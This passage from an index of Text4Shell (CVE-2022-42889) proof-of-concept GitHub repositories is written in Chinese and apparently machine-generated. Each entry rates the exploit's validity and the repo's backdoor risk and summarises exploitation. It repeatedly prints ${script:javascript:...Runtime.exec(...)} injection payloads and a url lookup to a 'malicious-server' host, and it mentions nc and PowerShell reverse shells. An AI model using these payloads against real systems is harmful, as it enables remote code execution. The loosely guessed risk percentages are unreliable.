CVE-2022-42889，也被称为 Text4Shell，是 Apache Commons Text 1.5 到 1.9 版本中的一个远程代码执行漏洞。该漏洞源于库中使用的字符串插值功能。当应用程序使用这些版本的 Commons Text，并且将用户提供的、未经充分清理的数据传递给 StringSubstitutor.replace() 方法时，攻击者可以利用`${prefix:name}`格式的字符串注入恶意代码。

**有效性：**

提供的PoC 代码有效，它演示了如何利用该漏洞执行任意命令。PoC 代码包含了一个 Spring Boot 应用程序，该程序接受一个名为 `search` 的请求参数，并使用 `StringSubstitutor.replace()` 方法对其进行插值。通过构造包含`${script:javascript:java.lang.Runtime.getRuntime().exec('command')}` 的恶意 payload，攻击者可以在服务器上执行任意命令。

**投毒风险：**

该仓库中作者隐藏的投毒代码可能性极低。`Dockerfile`、`pom.xml`和java源代码没有发现任何恶意行为。虽然存在远程代码执行漏洞，但这本身不是投毒。1%的风险在于构建脚本可能依赖于外部资源（例如，Maven仓库），这些资源可能在构建时被篡改，或者受到供应链攻击。但是，就提供的代码本身而言，它似乎没有包含故意的恶意代码。

**利用方式：**

1.  攻击者需要找到一个应用程序，该程序使用了存在漏洞的 Apache Commons Text 版本（<= 1.9）。
2.  攻击者需要在该应用程序中找到一个输入点（例如，HTTP 请求参数、表单字段等），该输入点允许攻击者控制将传递给 `StringSubstitutor.replace()` 方法的字符串。
3.  攻击者构造包含恶意`${prefix:name}` 表达式的 payload。`prefix` 可以是 `script`、`dns` 或 `url`。例如，可以使用 `${script:javascript:java.lang.Runtime.getRuntime().exec('command')}` 执行任意命令，使用 `${dns:address}` 解析恶意域名，或使用 `${url:UTF-8:url}` 从远程服务器加载数据。
4.  攻击者将 payload 传递给应用程序。
5.  应用程序使用 `StringSubstitutor.replace()` 方法处理 payload，导致恶意代码被执行。

**项目地址:** [DimaMend/cve-2022-42889-text4shell](https://github.com/DimaMend/cve-2022-42889-text4shell)

**漏洞详情:** [CVE-2022-42889](https://nvd.nist.gov/vuln/detail/CVE-2022-42889)

---

## POC #5

**来源**: [CVE-2022-42889-Gotcha1G_CVE-2022-42889.md](../2022/CVE-2022-42889-Gotcha1G_CVE-2022-42889.md)

## CVE-2022-42889-Apache Commons Text-RCE

**漏洞编号:** CVE-2022-42889

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Commons Text

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** <= 1.9

**利用条件:** 应用程序使用受影响版本的Apache Commons Text，且允许用户可控的输入传递给文本插值功能

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-42889，又名Text4Shell，是Apache Commons Text库中的一个远程代码执行漏洞。该漏洞源于库中不安全的默认文本插值配置，允许攻击者通过构造包含恶意表达式的输入，利用`script`, `dns`, 或 `url` 等lookup执行任意代码或与远程服务器通信。

**有效性：**
根据漏洞库信息、搜索引擎结果以及提供的PoC代码，此漏洞的利用是有效的。搜索引擎结果中的多个条目都将此漏洞描述为高危远程代码执行漏洞，并提供了利用示例。

**投毒风险：**
提供的PoC代码本身旨在验证漏洞的存在，通过`curl+{{interactsh-url}}`的方式来检测是否成功执行了命令。由于该PoC代码目的在于触发漏洞并进行验证，不包含恶意行为（例如：上传恶意文件、修改系统配置等），因此其主要风险在于被滥用进行攻击。但仓库中其他未提供的文件，可能存在隐藏的后门或恶意代码，因此综合判定存在10%的投毒风险。

**利用方式：**
攻击者将构造包含恶意表达式的字符串，例如`${script:javascript:java.lang.Runtime.getRuntime().exec('command')}`。这个字符串会被传递给使用了Apache Commons Text库进行文本插值的应用程序。如果应用程序没有对用户输入进行充分的验证和过滤，该表达式将被解析并执行，导致远程代码执行。PoC中使用了`curl`命令和`interactsh`服务来验证漏洞是否成功利用，实际攻击中可以替换成任何其他命令。

简而言之，利用方式是：
1.  应用程序使用存在漏洞的Apache Commons Text版本（<= 1.9）。
2.  应用程序允许用户可控的输入传递给文本插值功能。
3.  攻击者构造包含恶意表达式的输入。
4.  Apache Commons Text解析并执行恶意表达式，导致RCE。

**项目地址:** [Gotcha1G/CVE-2022-42889](https://github.com/Gotcha1G/CVE-2022-42889)

**漏洞详情:** [CVE-2022-42889](https://nvd.nist.gov/vuln/detail/CVE-2022-42889)

---

## POC #6

**来源**: [CVE-2022-42889-MendDemo-josh_cve-2022-42889-text4shell.md](../2022/CVE-2022-42889-MendDemo-josh_cve-2022-42889-text4shell.md)

## CVE-2022-42889 Text4Shell

**漏洞编号:** CVE-2022-42889

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Commons Text

**危害等级:** 高危，允许未经身份验证的攻击者执行任意代码

**影响版本:** 1.5 <= version <= 1.9

**利用条件:** 应用程序使用了受影响版本的Apache Commons Text，并且允许用户可控的字符串传递给`StringSubstitutor.replace()`方法。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-42889，又名Text4Shell，是Apache Commons Text库中的一个漏洞。该漏洞源于库中使用的字符串插值功能，攻击者可以通过构造包含恶意表达式的字符串，利用`script`, `dns` 或 `url` 等前缀，触发远程代码执行。该漏洞利用的有效性较高，因为提供的POC代码直接演示了如何使用`script`前缀执行`touch /tmp/foo`命令。Docker文件和README文件提供了构建和运行包含漏洞的应用程序的详细说明。尽管POC展示了RCE，但是仍然需要确认是否存在投毒风险，通过阅读所有提供的文件，没有发现任何隐藏的后门代码或其他恶意行为。Dockerfile文件用于构建包含漏洞应用程序的Docker镜像，pom.xml指定了所使用的commons-text版本为1.8，处于漏洞影响范围内。java代码也用于漏洞的验证。`HelloController.java` 暴露了一个 `/text4shell/attack` 的API接口，接收一个名为 `search` 的参数，并使用 `StringSubstitutor.replace()` 方法对其进行处理，从而导致漏洞。风险主要在于，这个demo程序是否会被滥用，作者是否会把这个程序用于攻击等等。 经过评估,作者投毒的可能性较小，但是仍然有一定的潜在风险，大约为10%。

**利用方式：**
1.  攻击者将特制的字符串（包含`${prefix:payload}`格式的恶意表达式）作为输入，传递给使用了`StringSubstitutor.replace()`方法的应用程序。
2.  `StringSubstitutor`会对字符串进行插值，如果`prefix`是`script`，`dns`或者`url`，则会调用相应的lookup来解析`payload`。
3.  `script`前缀允许执行任意的Java代码，`dns`前缀允许进行DNS查询，`url`前缀允许从URL加载内容，恶意构造的`payload`可以导致RCE或SSRF攻击。

**项目地址:** [MendDemo-josh/cve-2022-42889-text4shell](https://github.com/MendDemo-josh/cve-2022-42889-text4shell)

**漏洞详情:** [CVE-2022-42889](https://nvd.nist.gov/vuln/detail/CVE-2022-42889)

---

## POC #7

**来源**: [CVE-2022-42889-QAInsights_cve-2022-42889-jmeter.md](../2022/CVE-2022-42889-QAInsights_cve-2022-42889-jmeter.md)

## CVE-2022-42889: Apache Commons Text RCE

**漏洞编号:** CVE-2022-42889

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Commons Text

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 1.5 <= version <= 1.9

**利用条件:** 应用程序使用受影响版本的 Apache Commons Text，并且允许用户可控的字符串进行变量插值。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-42889 漏洞是 Apache Commons Text 库中一个远程代码执行漏洞，存在于 1.5 到 1.9 版本中。该漏洞源于库中存在不安全的默认变量插值配置，允许攻击者通过 `${prefix:name}` 格式的字符串执行任意代码或与远程服务器交互。其中，`prefix` 用于定位执行插值的 `org.apache.commons.text.lookup.StringLookup` 实例。存在风险的 `prefix` 包括 `script` (执行 JVM 脚本), `dns` (解析 DNS 记录), 和 `url` (从 URL 加载值)。

**有效性：**
根据漏洞描述、搜索结果和漏洞利用方式，该漏洞利用是有效的。搜索结果中多个链接表明该漏洞（又名 Text4Shell）是一个严重的安全问题，允许远程代码执行。

**投毒风险：**
提供的代码片段是 Apache License 的许可证文本，不包含任何可执行代码，因此不存在投毒风险。投毒风险评估为 0%。

**利用方式：**
1.  应用程序使用 Apache Commons Text 1.5 到 1.9 版本。
2.  应用程序接受用户提供的字符串，并使用该字符串进行变量插值，没有进行充分的过滤或安全处理。
3.  攻击者构造包含恶意 `prefix` 的字符串，例如 `${script:javascript code}` 或 `${url:http://malicious-server/evil.txt}`。
4.  Apache Commons Text 解析该字符串，并执行相应的操作，例如执行 JavaScript 代码或从恶意 URL 加载内容，从而导致远程代码执行或信息泄露。

**项目地址:** [QAInsights/cve-2022-42889-jmeter](https://github.com/QAInsights/cve-2022-42889-jmeter)

**漏洞详情:** [CVE-2022-42889](https://nvd.nist.gov/vuln/detail/CVE-2022-42889)

---

## POC #8

**来源**: [CVE-2022-42889-ReachabilityOrg_cve-2022-42889-text4shell-docker.md](../2022/CVE-2022-42889-ReachabilityOrg_cve-2022-42889-text4shell-docker.md)

## CVE-2022-42889 - Apache Commons Text RCE (Text4Shell)

**漏洞编号:** CVE-2022-42889

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Commons Text

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** <= 1.9, >= 1.5

**利用条件:** 应用程序使用受影响版本的Apache Commons Text，并且允许用户控制用于变量插值的输入。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-42889，又名Text4Shell，是一个存在于Apache Commons Text库中的远程代码执行漏洞。受影响的版本（1.5 到 1.9）中的默认插值器允许通过 `script`, `dns`, `url` 等前缀执行任意代码或与远程服务器建立连接。

**有效性：**

提供的POC代码是有效的，它展示了如何利用该漏洞。Dockerfile和pom.xml文件显示使用了易受攻击的Apache Commons Text 1.8版本。`README.md`文件提供了构建和运行POC应用程序的明确步骤，以及使用`${script:javascript:java.lang.Runtime.getRuntime().exec('touch /tmp/foo')}`有效负载触发RCE的示例。它尝试在/tmp/目录下创建一个文件来验证漏洞。

**投毒风险：**

该代码仓库中存在一些轻微的投毒风险的可能性。`whitesource.config`文件表明使用了 Whitesource，这是一种软件组合分析（SCA）工具。虽然这本身不是恶意行为，但可能表明作者试图隐藏某些依赖项或漏洞，或者他们正在使用自动化工具进行构建。代码结构较为简单，且RCE payload 明显，但仍需要对整个仓库进行细致的代码审计以完全确定是否还有其它隐藏的恶意代码，故判投毒比例为10%。

**利用方式：**

该漏洞的利用方式是通过构造包含恶意表达式的字符串，利用Apache Commons Text的字符串插值功能。攻击者可以将恶意表达式注入到应用程序使用的任何用户可控的输入中（例如，URL参数，POST数据等）。当应用程序使用`StringSubstitutor.createInterpolator()`并使用用户提供的输入执行插值时，恶意表达式将被执行。提供的POC使用`${script:javascript:java.lang.Runtime.getRuntime().exec('command')}` 形式的payload在目标机器上执行任意命令。其他的利用方式可以使用`dns`或`url`前缀来尝试联系恶意服务器或执行其他操作。

**项目地址:** [ReachabilityOrg/cve-2022-42889-text4shell-docker](https://github.com/ReachabilityOrg/cve-2022-42889-text4shell-docker)

**漏洞详情:** [CVE-2022-42889](https://nvd.nist.gov/vuln/detail/CVE-2022-42889)

---

## POC #9

**来源**: [CVE-2022-42889-Sic4rio_CVE-2022-42889.md](../2022/CVE-2022-42889-Sic4rio_CVE-2022-42889.md)

## CVE-2022-42889-Apache Commons Text-RCE

**漏洞编号:** CVE-2022-42889

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Commons Text

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** 1.5 <= version <= 1.9

**利用条件:** 应用程序使用受影响的 Apache Commons Text 版本，且允许用户可控的输入传递给 Commons Text 的文本插值功能。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-42889 (Text4Shell) 是 Apache Commons Text 库中的一个远程代码执行漏洞。该漏洞源于库中的变量插值功能，允许攻击者通过构造恶意输入，利用`script`, `dns`, 和 `url` 等 StringLookup 实现执行任意代码或与远程服务器进行交互。 

**有效性：**

根据漏洞信息、搜索结果和提供的POC代码，此漏洞利用是有效的。搜索结果中多个链接（例如：[webpage 1], [webpage 2], [webpage 4], [webpage 6], [webpage 9]）都表明此漏洞是远程代码执行漏洞，且危害严重。POC代码通过 `${script:javascript:java.lang.Runtime.getRuntime().exec(...) }` 构造恶意payload，利用 `script` StringLookup 执行系统命令，验证了漏洞的存在。

**投毒风险：**

提供的python POC代码主要功能是发送包含恶意payload的HTTP请求，payload会利用目标服务器上的java环境来执行命令。投毒代码分析如下：
*   代码的功能相对清晰，主要是构造payload发送请求，执行反弹shell。
*   风险点在于 `busybox nc` 命令，攻击者可能通过修改 IP 地址和端口来连接受害者的机器，但这是漏洞利用本身需要的，不能算是作者特意植入的后门。
*   虽然使用了`verify=False` 绕过了ssl证书校验，但这是为了方便测试自签名证书的情况，也属于正常情况。
*   代码中存在TerminalColors类，为输出添加颜色。这部分代码不会影响payload的执行，可以认为是正常的。

总体来看，代码本身并没有明显的恶意行为，但使用者需要注意，在未授权的情况下使用此脚本进行攻击属于非法行为。因此，投毒风险评估为5%。

**利用方式：**

1.  **确定目标：** 确定目标应用程序使用了存在漏洞的 Apache Commons Text 版本（1.5 到 1.9）。
2.  **构造Payload：**  构造包含恶意代码的字符串，利用`${prefix:name}` 格式进行变量插值。其中，`prefix` 可以是 `script`、`dns` 或 `url` 等，利用这些 StringLookup 实现执行命令或访问远程资源。
3.  **发送请求：**  将构造的恶意字符串作为输入，通过HTTP请求或其他方式发送给目标应用程序。该输入需要到达使用 Apache Commons Text 进行插值处理的地方。
4.  **执行代码：**  如果目标应用程序存在漏洞，Apache Commons Text 会解析恶意字符串，执行其中的代码。
5.  **反弹shell：**  POC中使用 `busybox nc` 命令反弹 shell，攻击者可以控制目标系统。

**项目地址:** [Sic4rio/CVE-2022-42889](https://github.com/Sic4rio/CVE-2022-42889)

**漏洞详情:** [CVE-2022-42889](https://nvd.nist.gov/vuln/detail/CVE-2022-42889)

---

## POC #10

**来源**: [CVE-2022-42889-Syndicate27_text4shell-exploit.md](../2022/CVE-2022-42889-Syndicate27_text4shell-exploit.md)

## CVE-2022-42889 - Apache Commons Text 远程代码执行

**漏洞编号:** CVE-2022-42889

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Commons Text

**危害等级:** 高危，允许未经身份验证的攻击者执行任意命令

**影响版本:** < 1.10.0 (1.5 - 1.9)

**利用条件:** 应用程序使用受影响版本的 Apache Commons Text，且允许用户可控的输入参与 `${}` 格式的字符串插值。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-42889，也被称为 Text4Shell，是一个影响 Apache Commons Text 1.5 到 1.9 版本的远程代码执行漏洞。该漏洞源于库中不安全的默认插值器，允许攻击者利用 'script'、'dns' 和 'url' 等前缀执行恶意代码。 

**有效性:**
根据漏洞库信息、搜索引擎结果和提供的 PoC 代码，此漏洞利用是有效的。PoC 代码展示了如何使用 `${script:javascript:java.lang.Runtime.getRuntime().exec(...)}` 构造恶意 payload，并通过 HTTP POST 请求发送到目标服务器，从而执行任意系统命令。

**投毒风险:**
分析 PoC 代码，未发现明显的投毒代码。该代码结构简单，主要功能是构造 payload 并发送 HTTP 请求。许可证和 README 文件也比较规范，没有可疑之处。因此，投毒风险评估为 0%。

**利用方式:**
1.  **确定目标应用:** 找到使用了存在漏洞的 Apache Commons Text 版本的 Java 应用程序，并且该应用允许用户控制的输入参与字符串插值。
2.  **构造 Payload:** 使用`${script:javascript:java.lang.Runtime.getRuntime().exec(...)}`或类似的方式构造恶意 payload，其中 `...` 部分包含要执行的系统命令，如反弹 shell 等。
3.  **URL 编码:** 对构造好的 payload 进行 URL 编码，以确保其能够正确地通过 HTTP 请求传输。
4.  **发送请求:**  将编码后的 payload 嵌入到 HTTP 请求的参数中（如 GET 请求的查询参数或 POST 请求的 body），发送到目标应用程序。
5.  **监听连接:**  如果 payload 是反弹 shell，需要在攻击者机器上监听相应的端口，等待目标机器连接。

**修复建议:**
升级到 Apache Commons Text 1.10.0 或更高版本，该版本默认禁用了有问题的插值器。如果无法升级，可以考虑禁用或限制应用程序中使用的插值器，或者对用户输入进行严格的验证和过滤。

**项目地址:** [Syndicate27/text4shell-exploit](https://github.com/Syndicate27/text4shell-exploit)

**漏洞详情:** [CVE-2022-42889](https://nvd.nist.gov/vuln/detail/CVE-2022-42889)

---

## POC #11

**来源**: [CVE-2022-42889-aaronm-sysdig_text4shell-docker.md](../2022/CVE-2022-42889-aaronm-sysdig_text4shell-docker.md)

## CVE-2022-42889-Apache Commons Text-RCE

**漏洞编号:** CVE-2022-42889

**漏洞类型:** 远程代码执行(RCE)

**影响应用:** Apache Commons Text

**危害等级:** 高危，可导致服务器被完全控制

**影响版本:** <= 1.9

**利用条件:** 应用程序使用Apache Commons Text <= 1.9，且允许用户可控的字符串进行变量插值

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-42889，又名Text4Shell，是Apache Commons Text库中的一个高危漏洞。该漏洞源于程序在处理用户提供的字符串时，使用了不安全的变量插值功能。攻击者可以通过构造包含恶意表达式的字符串，例如`${script:javascript:java.lang.Runtime.getRuntime().exec('touch /tmp/foo')}`，利用`script`、`dns`或`url`等lookup前缀，执行任意代码。 

**有效性：**

根据漏洞库信息、搜索引擎结果和提供的POC代码，该漏洞是有效的。漏洞利用代码中的Dockerfile-vuln和README.md文件清晰地展示了如何构建一个包含漏洞的应用程序，并使用特定的payload触发远程代码执行，例如创建`/tmp/foo`文件。

**投毒风险：**

该仓库的投毒风险较低，约为5%。 虽然不能完全排除作者隐藏恶意代码的可能性，但是从以下几点可以分析出，投毒的概率较低:

*   提供的代码主要是漏洞的演示和利用，重点在于复现漏洞本身。
*   Dockerfiles主要用于环境搭建，没有发现可疑的恶意命令。
*   pom-patched.xml修复了漏洞，pom-vuln.xml 包含漏洞，本身是用来复现漏洞的。
*   README.md 详细描述了利用步骤和验证方式，方便用户理解和测试。
*   azure-pipelines.yml 使用Sysdig进行安全扫描，表明作者可能关注安全性问题。

**可能的投毒方式（仅为假设）**:

*   在`src`目录下的Java代码中加入后门。
*   修改`pom.xml`，引入恶意的依赖项。
*   在Dockerfile中添加执行恶意命令的指令。

**利用方式：**

1.  应用程序使用Apache Commons Text 1.5到1.9之间的版本。
2.  应用程序允许用户提供字符串，这些字符串将被用于变量插值。
3.  攻击者构造包含恶意表达式的字符串，例如 `${script:javascript:java.lang.Runtime.getRuntime().exec('command')}`，其中 `command` 是攻击者想要执行的系统命令。
4.  应用程序解析并执行该字符串，导致远程代码执行。

**缓解措施：**

1.  升级到Apache Commons Text 1.10.0或更高版本，该版本默认禁用了存在风险的interpolator。
2.  如果无法升级，禁用或限制应用程序中使用的lookup，移除`script`、`dns`和`url`等lookup的默认配置。
3.  对用户提供的输入进行严格的验证和过滤，防止恶意表达式的注入。

**项目地址:** [aaronm-sysdig/text4shell-docker](https://github.com/aaronm-sysdig/text4shell-docker)

**漏洞详情:** [CVE-2022-42889](https://nvd.nist.gov/vuln/detail/CVE-2022-42889)

---

## POC #12

**来源**: [CVE-2022-42889-adarshpv9746_Text4shell--Automated-exploit---CVE-2022-42889.md](../2022/CVE-2022-42889-adarshpv9746_Text4shell--Automated-exploit---CVE-2022-42889.md)

## CVE-2022-42889-Apache Commons Text-RCE

**漏洞编号:** CVE-2022-42889

**漏洞类型:** 远程代码执行

**影响应用:** Apache Commons Text

**危害等级:** 高危，允许未经身份验证的攻击者执行任意命令

**影响版本:** < 1.10.0 (1.5-1.9)

**利用条件:** 应用程序使用受影响版本的Apache Commons Text，并且允许用户可控的输入传递给文本插值函数

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-42889（又名Text4Shell）是Apache Commons Text库中的一个漏洞，它允许攻击者通过变量插值执行任意代码。该漏洞存在于1.5到1.9版本中。漏洞利用方式是，攻击者可以向应用程序提供包含恶意表达式的输入，例如`${script:javascript:java.lang.Runtime.getRuntime().exec('command')}`。当应用程序使用Commons Text处理此输入时，该表达式将被解析和执行，从而导致远程代码执行。

**有效性评估：**
提供的POC代码似乎有效，因为它演示了如何使用`script`前缀执行任意命令。 Dockerfile 和 README.md 文件描述了如何构建和运行一个易受攻击的应用程序，`exploit.php` 文件构造了利用此漏洞的有效载荷。从搜索结果来看，该漏洞是一个高危漏洞，已经被广泛研究和利用。

**投毒风险分析：**
该仓库中存在潜在的投毒风险，但概率较低。以下是一些需要考虑的因素：

*   `install.sh` 和 `stop-app.sh` 脚本包含一些危险的命令，例如 `sudo` 命令以及`docker kill $(sudo docker ps -q)`。虽然这是为了快速启动和停止 docker 环境，但是也可能会被恶意使用，例如，如果攻击者控制了这些脚本，他们可以利用 `sudo` 命令来执行恶意操作。
*   `exploit.php` 文件中的 `$ip = "172.17.0.1";` 可能是一个陷阱。如果攻击者直接使用这段代码，他们的反向shell可能无法连接，从而暴露出攻击者。

考虑到作者的意图是演示漏洞利用，而并非恶意攻击，将此代码判定为投毒代码的概率为10%。

**利用方式：**
1.  构建和运行易受攻击的应用程序。
2.  构造包含恶意表达式的输入，例如 `${script:javascript:java.lang.Runtime.getRuntime().exec('command')}`。
3.  将此输入传递给应用程序的文本插值函数。
4.  表达式将被解析和执行，从而导致远程代码执行。`exploit.sh`和`exploit.php` 文件提供了一种自动化的利用方式，利用`nc`进行反弹shell。

**项目地址:** [adarshpv9746/Text4shell--Automated-exploit---CVE-2022-42889](https://github.com/adarshpv9746/Text4shell--Automated-exploit---CVE-2022-42889)

**漏洞详情:** [CVE-2022-42889](https://nvd.nist.gov/vuln/detail/CVE-2022-42889)

---

## POC #13

**来源**: [CVE-2022-42889-chainguard-dev_text4shell-policy.md](../2022/CVE-2022-42889-chainguard-dev_text4shell-policy.md)

## CVE-2022-42889 Apache Commons Text Text4Shell RCE

**漏洞编号:** CVE-2022-42889

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Commons Text

**危害等级:** 高危，允许未经授权的攻击者执行任意代码

**影响版本:** <= 1.9

**利用条件:** 应用程序使用受影响版本的 Apache Commons Text 且允许用户控制的输入传递给插值功能。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-42889，又名Text4Shell，是Apache Commons Text库中的一个漏洞，该漏洞允许攻击者通过变量插值执行任意代码。当应用程序使用受影响版本（1.5 到 1.9）的库，并且允许不可信的输入传递给执行插值的函数时，就存在风险。 

**有效性分析：**

根据漏洞库信息和搜索结果，该漏洞是真实存在的，并且危害等级高，可以远程执行代码。提供的 Dockerfile 展示了如何使用包含漏洞的 commons-text-1.0.0-SNAPSHOT.jar 包构建镜像，并通过 java -jar 命令运行，这意味着该 POC 能够重现漏洞，证明其有效性。

**投毒风险分析：**

提供的代码包括一个 Dockerfile 和一个 LICENSE 文件。Dockerfile 用于构建一个包含易受攻击的Apache Commons Text库的Java应用程序镜像。LICENSE文件是标准的Apache 2.0许可协议，本身不包含恶意代码。由于Dockerfile只是部署了漏洞利用所需的易受攻击的jar包，并没有其他可疑操作，因此该仓库直接包含投毒代码的可能性较低，但存在一定的供应链风险，即如果依赖的jar包本身就被投毒，那么部署的应用也就会被投毒。综合判断，投毒的可能性评估为5%。

**利用方式：**

该漏洞的利用方式是构造包含恶意表达式的字符串，利用 Apache Commons Text 的字符串插值功能执行任意代码。具体步骤如下：

1.  确定应用程序中使用了 Apache Commons Text 库，并且版本在 1.5 到 1.9 之间。
2.  找到应用程序中允许用户控制的输入点，该输入会被传递给 Apache Commons Text 的字符串插值功能。
3.  构造包含恶意表达式的输入字符串，例如 `${script:javascript:java.lang.Runtime.getRuntime().exec('evil command')}`。其中，`script` 前缀指示使用 javax.script 引擎执行代码。其他的利用方式还包括使用 `dns` 和 `url` 前缀。
4.  将构造的恶意字符串发送给应用程序。
5.  应用程序使用 Apache Commons Text 进行字符串插值时，会执行恶意表达式，从而导致远程代码执行。

**修复建议：**

升级到 Apache Commons Text 1.10.0 或更高版本。该版本默认禁用了有风险的插值器。

**项目地址:** [chainguard-dev/text4shell-policy](https://github.com/chainguard-dev/text4shell-policy)

**漏洞详情:** [CVE-2022-42889](https://nvd.nist.gov/vuln/detail/CVE-2022-42889)

---

## POC #14

**来源**: [CVE-2022-42889-cryxnet_CVE-2022-42889-RCE.md](../2022/CVE-2022-42889-cryxnet_CVE-2022-42889-RCE.md)

## CVE-2022-42889-Apache Commons Text RCE (Text4Shell)

**漏洞编号:** CVE-2022-42889

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Commons Text

**危害等级:** 高危，允许未经身份验证的攻击者执行任意命令

**影响版本:** 1.5 - 1.9

**利用条件:** 需要应用程序使用Apache Commons Text 1.5-1.9版本,并且允许从不受信任的源接收和处理字符串输入。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-42889，也被称为Text4Shell，是Apache Commons Text库中的一个远程代码执行漏洞。该漏洞源于库中存在不安全的变量插值功能。攻击者可以通过构造包含恶意表达式的字符串，利用`${prefix:name}`格式进行插值，其中 `prefix` 指定了 `StringLookup` 的实例，而 `name` 包含了要执行的命令或表达式。

**有效性：**
根据提供的漏洞信息和搜索结果，该漏洞是真实存在的，并且影响Apache Commons Text 1.5到1.9版本。POC代码的`README.md`文件描述了漏洞原理和利用方式，`main.py`文件包含了利用漏洞的代码示例。利用脚本中使用了`script`、`url` 和 `dns` 等前缀，这些前缀在受影响的版本中默认启用，可导致任意代码执行。

**投毒风险：**
该POC代码主要目标是利用漏洞，但存在一定的投毒风险。风险评估在10%。主要原因分析如下：

*   **代码混淆/隐藏：** 虽然没有明显的混淆，但是代码的可读性不是非常高，存在一些压缩和简化写法，这可能用来隐藏恶意代码。
*   **恶意依赖：** 脚本中使用了`os`, `requests`, `colorama`, `base64`, `nmap`库。这些库本身没有问题，但存在被滥用的可能. 比如`os.system` 或 `subprocess.call` 执行恶意命令.
*   **Payload生成：** 脚本中定义了`payloads`字典，其中包含一些 RCE Payload。攻击者可能会修改这些payload执行恶意指令。
*   **网络行为：** 脚本使用`requests`库，可能用于下载恶意payload或者回传信息。`nmap` 也可能被滥用。
*   **powershellRevshell：** 脚本包含了一个powershell reverse shell 脚本，需要LHOST和LPORT，可能被用于植入后门。

**利用方式：**
利用方式如下：
1.  **漏洞定位：** 找到使用存在漏洞的 Apache Commons Text 库，且允许用户可控输入的地方。
2.  **构造Payload：** 构造包含恶意表达式的字符串，例如 `${script:javascript:java.lang.Runtime.getRuntime().exec('COMMAND')}`。将 'COMMAND' 替换为要执行的命令。
3.  **发送Payload：** 将构造的Payload发送到目标应用程序。
4.  **执行代码：** 如果应用程序使用存在漏洞的Commons Text库处理了Payload，那么恶意命令将被执行。

**总结：**
该漏洞利用的有效性较高，因为可以通过多种方式执行任意命令。虽然提供的POC主要是为了验证漏洞，但是如果被恶意修改，仍然存在投毒的可能。使用该POC时需要注意安全风险，并对其代码进行详细审查。

**项目地址:** [cryxnet/CVE-2022-42889-RCE](https://github.com/cryxnet/CVE-2022-42889-RCE)

**漏洞详情:** [CVE-2022-42889](https://nvd.nist.gov/vuln/detail/CVE-2022-42889)

---

## POC #15

**来源**: [CVE-2022-42889-cxzero_CVE-2022-42889-text4shell.md](../2022/CVE-2022-42889-cxzero_CVE-2022-42889-text4shell.md)

## CVE-2022-42889 - Apache Commons Text RCE (Text4Shell)

**漏洞编号:** CVE-2022-42889

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Commons Text

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 1.5 <= 版本 <= 1.9

**利用条件:** 应用程序使用受影响版本的 Apache Commons Text，并且允许用户控制的输入传递给 StringSubstitutor.replace() 或 StringSubstitutor.replaceIn() 方法进行插值。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-42889，也被称为 Text4Shell，是一个存在于 Apache Commons Text 库中的高危漏洞。该漏洞源于库中 StringSubstitutor 类的变量插值功能。如果应用程序使用受影响版本（1.5 到 1.9）的 Apache Commons Text，并且允许用户控制的输入用于字符串插值，那么攻击者可以通过构造恶意输入来执行任意代码。

**利用方式：**

攻击者可以利用 `${prefix:name}` 格式的字符串，其中 `prefix` 指定了用于查找 `StringLookup` 实例的前缀。漏洞存在于以下几个 lookup 中：

*   **script:** 允许使用 JVM 脚本执行引擎（javax.script）执行表达式。例如，在 JDK 15 之前，可以使用 Nashorn 引擎执行 JavaScript 代码，从而执行任意命令：`${script:javascript:java.lang.Runtime.getRuntime().exec('touch /tmp/foo')}`。在 JDK 15 及更高版本中，如果应用程序包含 JEXL 等第三方依赖，仍然可能通过类似方式执行代码。
*   **dns:** 允许解析 DNS 记录。虽然不能直接执行代码，但可以用于信息收集或发起拒绝服务攻击：`${dns:address|commons.apache.org}`。
*   **url:** 允许从指定的 URL 加载值，包括远程服务器。这可以用来读取敏感信息或通过 SSRF 发起攻击：`${url:UTF-8:https://nvd.nist.gov/vuln/detail/CVE-2022-42889}`。

**POC 分析：**

提供的 Dockerfile 和 README 文件提供了一个可用于测试和验证此漏洞的 POC 环境。Dockerfile 设置了所需的 Java 环境，并编译和运行包含漏洞的应用程序。README 提供了不同利用方式的示例，包括使用 `script`、`dns` 和 `url` lookup 的 payload。

**投毒风险分析：**

根据提供的文件内容，该仓库的主要目的是为了重现和演示 CVE-2022-42889 漏洞。评估投毒风险较低。Dockerfile虽然安装了一些如netcat，wget，curl等工具，可以辅助漏洞验证。但根据POC利用的常规方式，以及参考互联网上已公开的POC和EXP来看，这些工具都是常规操作。

**总结：**

CVE-2022-42889 是一个严重的安全漏洞，允许攻击者远程执行代码。应用程序应尽快升级到 Apache Commons Text 1.10.0 或更高版本，以禁用有问题的 interpolator，并仔细审查代码，确保用户提供的输入不会用于字符串插值。提供的 POC 代码对于理解和验证漏洞非常有用，但应谨慎使用，并采取适当的安全措施。

**项目地址:** [cxzero/CVE-2022-42889-text4shell](https://github.com/cxzero/CVE-2022-42889-text4shell)

**漏洞详情:** [CVE-2022-42889](https://nvd.nist.gov/vuln/detail/CVE-2022-42889)

---

## POC #16

